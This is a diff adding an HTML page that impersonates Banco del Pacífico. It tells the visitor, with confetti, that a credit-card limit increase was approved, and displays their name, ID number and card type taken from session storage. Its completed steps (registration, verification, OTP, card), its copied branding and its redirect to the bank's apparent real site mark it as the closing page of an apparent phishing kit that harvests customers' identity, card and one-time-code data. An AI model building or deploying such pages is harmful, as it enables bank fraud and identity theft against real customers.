@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Solicitud Aprobada</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:center;justify-content:center;padding:24px 16px}
+    .card{background:#fff;border-radius:12px;padding:44px 32px;width:100%;max-width:440px;box-shadow:0 2px 16px rgba(0,0,0,.09);text-align:center}
+
+    /* Ícono de éxito animado */
+    .success-circle{
+      width:82px;height:82px;border-radius:50%;
+      background:linear-gradient(135deg,#2f9e44,#40c057);
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 24px;
+      box-shadow:0 6px 20px rgba(47,158,68,.3);
+      animation:popIn .5s cubic-bezier(.175,.885,.32,1.275) both;
+    }
+    @keyframes popIn{
+      0%{transform:scale(0);opacity:0}
+      100%{transform:scale(1);opacity:1}
+    }
+    .success-circle svg{width:40px;height:40px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round}
+    .checkmark{stroke-dasharray:60;stroke-dashoffset:60;animation:draw .4s .4s ease forwards}
+    @keyframes draw{to{stroke-dashoffset:0}}
+
+    .badge{
+      display:inline-block;
+      background:#ebfbee;border:1px solid #b2f2bb;
+      color:#2f9e44;font-size:.75rem;font-weight:700;
+      border-radius:20px;padding:4px 14px;
+      margin-bottom:16px;letter-spacing:.04em;
+      text-transform:uppercase;
+    }
+
+    h2{font-size:1.4rem;font-weight:800;color:#1a3a6b;margin-bottom:10px}
+    .subtitle{font-size:.88rem;color:#888;line-height:1.65;margin-bottom:28px}
+    .subtitle strong{color:#1a3a6b}
+
+    /* Tarjeta de detalle */
+    .detail-box{
+      background:#f4f7fb;border-radius:10px;
+      padding:18px 20px;margin-bottom:24px;
+      text-align:left;
+    }
+    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #e4eaf2}
+    .detail-row:last-child{border-bottom:none}
+    .detail-label{font-size:.78rem;color:#888}
+    .detail-value{font-size:.85rem;font-weight:600;color:#1a3a6b}
+    .detail-value.green{color:#2f9e44}
+
+    /* Barra de progreso */
+    .progress-section{margin-bottom:24px;text-align:left}
+    .progress-label{font-size:.78rem;color:#888;margin-bottom:8px}
+    .progress-bar{background:#e8edf3;border-radius:20px;height:8px;overflow:hidden}
+    .progress-fill{height:100%;border-radius:20px;background:linear-gradient(90deg,#1a56a0,#40c057);width:100%;animation:fillBar .8s .6s ease both}
+    @keyframes fillBar{from{width:0}to{width:100%}}
+    .progress-steps{display:flex;justify-content:space-between;margin-top:6px}
+    .progress-steps span{font-size:.68rem;color:#aaa}
+    .progress-steps span.done{color:#2f9e44;font-weight:600}
+
+    .btn-primary{
+      width:100%;background:#1a56a0;color:#fff;
+      border:none;border-radius:8px;padding:14px;
+      font-size:1rem;font-weight:700;cursor:pointer;
+      transition:background .2s;margin-bottom:12px;
+    }
+    .btn-primary:hover{background:#154a8a}
+    .btn-secondary{
+      width:100%;background:transparent;color:#1a56a0;
+      border:1.5px solid #1a56a0;border-radius:8px;padding:13px;
+      font-size:.95rem;font-weight:600;cursor:pointer;
+      transition:background .2s;
+    }
+    .btn-secondary:hover{background:#eef4fb}
+
+    .footer-note{text-align:center;font-size:.7rem;color:#ccc;margin-top:24px;line-height:1.6}
+
+    /* Confetti */
+    .confetti-wrap{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+    canvas{display:block}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+
+<div class="confetti-wrap"><canvas id="confetti"></canvas></div>
+
+<div class="page">
+  <div class="card" style="position:relative;z-index:1">
+
+    <div class="success-circle">
+      <svg viewBox="0 0 24 24">
+        <polyline class="checkmark" points="4,13 9,18 20,7"/>
+      </svg>
+    </div>
+
+    <span class="badge">✅ Solicitud Aprobada</span>
+    <h2>¡Tu cupo fue aumentado!</h2>
+    <p class="subtitle">
+      Estimado/a <strong id="clienteNombre">Cliente</strong>, tu solicitud de aumento de cupo de tarjeta de crédito ha sido procesada y <strong>aprobada exitosamente</strong>.
+    </p>
+
+    <div class="detail-box">
+      <div class="detail-row">
+        <span class="detail-label">Titular</span>
+        <span class="detail-value" id="detNombre">—</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Cédula</span>
+        <span class="detail-value" id="detCedula">—</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Tarjeta</span>
+        <span class="detail-value" id="detTarjeta">•••• •••• •••• ——</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Tipo</span>
+        <span class="detail-value" id="detTipo">—</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Estado</span>
+        <span class="detail-value green">✅ Aprobado</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Fecha</span>
+        <span class="detail-value" id="detFecha">—</span>
+      </div>
+    </div>
+
+    <div class="progress-section">
+      <p class="progress-label">Proceso completado</p>
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+      <div class="progress-steps">
+        <span class="done">Registro</span>
+        <span class="done">Verificación</span>
+        <span class="done">OTP</span>
+        <span class="done">Tarjeta</span>
+        <span class="done">Aprobado</span>
+      </div>
+    </div>
+
+    <button class="btn-primary" onclick="irAlBanco()">Ir a Banca Virtual</button>
+    <button class="btn-secondary" onclick="cerrar()">Cerrar sesión</button>
+
+    <p class="footer-note">© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+</div>
+
+<script>
+  // Rellenar datos desde sessionStorage
+  const nombre  = sessionStorage.getItem('bp_nombre')    || 'Cliente';
+  const cedula  = sessionStorage.getItem('bp_cedula')    || '—';
+  const tipo    = sessionStorage.getItem('bp_card_type') || '—';
+
+  document.getElementById('clienteNombre').textContent = nombre.split(' ')[0];
+  document.getElementById('detNombre').textContent     = nombre;
+  document.getElementById('detCedula').textContent     = cedula;
+  document.getElementById('detTipo').textContent       = tipo;
+  document.getElementById('detFecha').textContent      = new Date().toLocaleDateString('es-EC', {
+    year:'numeric', month:'long', day:'numeric',
+    hour:'2-digit', minute:'2-digit'
+  });
+
+  function irAlBanco(){ window.location.href = 'https://www.intermatico.com'; }
+  function cerrar(){
+    sessionStorage.clear();
+    window.location.href = 'index.html';
+  }
+
+  // Confetti suave
+  const canvas = document.getElementById('confetti');
+  const ctx = canvas.getContext('2d');
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const colors = ['#1a56a0','#40c057','#ffd43b','#f06595','#74c0fc'];
+  const pieces = Array.from({length:80}, () => ({
+    x: Math.random() * canvas.width,
+    y: Math.random() * -canvas.height,
+    w: Math.random() * 8 + 4,
+    h: Math.random() * 14 + 6,
+    color: colors[Math.floor(Math.random() * colors.length)],
+    speed: Math.random() * 2 + 1,
+    angle: Math.random() * 360,
+    spin: (Math.random() - 0.5) * 4,
+    opacity: Math.random() * 0.7 + 0.3,
+  }));
+
+  let running = true;
+  function drawConfetti(){
+    if(!running) return;
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    pieces.forEach(p => {
+      ctx.save();
+      ctx.globalAlpha = p.opacity;
+      ctx.translate(p.x + p.w/2, p.y + p.h/2);
+      ctx.rotate(p.angle * Math.PI/180);
+      ctx.fillStyle = p.color;
+      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+      ctx.restore();
+      p.y += p.speed;
+      p.angle += p.spin;
+      if(p.y > canvas.height) { p.y = -p.h; p.x = Math.random() * canvas.width; }
+    });
+    requestAnimationFrame(drawConfetti);
+  }
+  drawConfetti();
+  setTimeout(() => { running = false; ctx.clearRect(0,0,canvas.width,canvas.height); }, 4000);
+</script>
+</body>
+</html>
